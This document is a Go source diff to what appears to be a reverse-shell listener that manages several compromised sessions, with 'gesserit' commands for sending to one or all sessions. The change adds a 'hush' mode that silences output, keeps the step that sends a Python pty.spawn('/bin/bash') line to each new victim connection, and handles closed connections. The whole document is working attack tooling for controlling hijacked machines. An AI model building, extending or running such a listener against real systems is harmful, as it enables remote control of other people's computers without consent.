@@ -20,6 +20,8 @@ type session struct {
 	sid int
 }
 
+var hushed bool
+
 func receiveData(conn net.Conn) string {
 	msg := make([]byte, 2048)
 	_, err := conn.Read(msg[0:])
@@ -43,12 +45,18 @@ func groupSendData(groupSessionList []session, data string) {
 }
 
 func handleConnection(s session) {
-	fmt.Println("attempting to spawn tty session...")
-	tty_spawn := "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
-	sendData(s.connection, tty_spawn)
-	fmt.Println("------------------------------------------")
+	if hushed == false {
+		fmt.Println("attempting to spawn tty session...")
+		tty_spawn := "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
+		sendData(s.connection, tty_spawn)
+		fmt.Println("------------------------------------------")
+	}
 	for {
-		fmt.Print(receiveData(s.connection))
+		_, err := fmt.Print(receiveData(s.connection))
+		if err != nil {
+			fmt.Println("Connection", s.connection, "closed")
+			return
+		}
 	}
 }
 
@@ -63,7 +71,9 @@ func listen(l net.Listener, sessions *[]session){
 		}
 		s := session{conn, i}
 		*sessions = append(*sessions, s)
-		fmt.Println("New Session from " + conn.RemoteAddr().String())
+		if hushed == false {
+			fmt.Println("New Session from " + conn.RemoteAddr().String())
+		}
 		i++
 		go handleConnection(s)
 		defer conn.Close()
@@ -138,6 +148,10 @@ func main() {
 		} else if strings.Contains(cmd, "gesserit groupsend"){
 			newCmd := cmd[18:]
 			groupSendData(groupSessionList, newCmd)
+		} else if strings.Contains(cmd, "gesserit hush"){
+			hushed = true
+		} else if strings.Contains(cmd, "gesserit yell"){
+			hushed = false
 		} else if cmd == "gesserit quit\n" {
 			os.Exit(3)
 		} else {
